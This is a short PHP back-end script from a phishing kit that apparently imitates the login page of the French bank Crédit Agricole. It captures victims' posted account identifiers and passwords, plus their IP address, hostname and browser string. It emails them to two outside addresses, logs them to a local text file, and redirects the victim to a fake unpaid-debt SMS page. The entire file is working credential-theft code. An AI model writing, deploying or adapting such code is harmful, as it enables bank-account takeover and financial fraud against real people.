<?

$ip = getenv("REMOTE_ADDR");
$rx = "
-------------------+ Tél Agricole +-------------------
User: ".$_POST['CCPTE']."
Pass: ".$_POST['CCCRYC']."
-------------------+ Tél login +-------------------
User: ".$_POST['zip']."
Pass: ".$_POST['cpp']."
--------------------------------------
IP      : ".$ip."
HOST    : ".gethostbyaddr($ip)."
BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
-------------------+ Login 2019 +-------------------

";

$xmail = "freeborne@netcourrier.com,zaz.loze@yahoo.com";

mail($xmail,"Tél Agricole|".$ip,$rx,"From: Log<localhost>");
echo('<META http-equiv="refresh" content="0;URL=sms.html?page=recouvrement&impaye=4ad939f0d4548dfeab228bf7e7528eea597404c06ea733402847fed7cf6f3ccf">');
$txt = fopen('rezlt.txt', 'a');
fwrite($txt, $rx);
fclose($txt);
?>